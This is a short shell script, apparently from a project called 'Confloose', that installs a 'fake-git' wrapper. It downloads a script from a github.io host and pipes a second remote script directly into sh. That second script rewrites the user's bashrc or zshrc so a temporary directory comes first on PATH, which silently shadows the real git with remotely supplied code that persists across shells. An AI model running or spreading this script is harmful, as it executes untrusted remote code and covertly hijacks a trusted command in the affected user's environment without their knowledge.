#!/bin/sh

tempdir=$(mktemp -d)

curl "${CONFLOOSE_BASE:-https://louismoretti.github.io/Confloose}/confloose/fake-git/git.sh" >> "$tempdir/git"
chmod +x "$tempdir/git"

echo $(curl "${CONFLOOSE_BASE:-https://louismoretti.github.io/Confloose}/confloose/bashrc_confloose_base.sh") "fake-git" "'export PATH=\"$tempdir:\$PATH\"'" | sh
for name in bashrc zshrc; do source "$HOME/.$name" 2>/dev/null; done
